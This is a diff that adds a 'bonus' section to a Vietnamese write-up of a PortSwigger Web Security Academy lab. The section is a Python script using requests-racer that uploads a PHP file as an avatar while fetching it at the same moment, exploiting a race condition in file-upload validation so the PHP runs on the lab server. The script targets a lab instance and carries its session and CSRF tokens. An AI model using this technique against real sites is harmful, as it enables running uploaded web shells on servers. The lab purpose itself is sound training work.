@@ -401,4 +401,33 @@ Kết quả ta thu được các GET request với status code 200, tức nó c�
 Submit secret và solve bài lab
 >![](https://i.imgur.com/HxJ22XF.png)
 
+**Bonus cript python request racing**
+Em sử dụng code request_racer ở repo: https://github.com/nccgroup/requests-racer
+Sửa lại tham số `num_chunk` trong file `core.py` của nó thành 1
+Và script của em như sau
+```python
+import requests
+from requests_racer import SynchronizedSession
+import html2text
+
+s = SynchronizedSession(num_threads=2)
+url = "https://0aea001004f9aaaec07aa98800d700d7.web-security-academy.net/"
+file = { "avatar" : open('exp.php','rb')}
+cookie = {
+    "session" : "phYQ9TggcTad5i8qJuyqOzDxJhktb6wm"
+}
+data = {
+    "csrf" :"eoowJPdrhCdKPUeN69ACrb7lvEYIBure",
+    "user" : "wiener"
+}
+
+r1 = s.post(url=url +"my-account/avatar", files=file, data=data, cookies=cookie)
+r2 = s.get(url=url+ "files/avatars/exp.php", cookies=cookie)
+
+s.finish_all()
+print(r1.status_code)
+print(html2text.html2text(r2.text))
+```
+
+Có thể 1 số lần racing không thành công, thử lại thêm sẽ thấy có kết quả
 <hr>
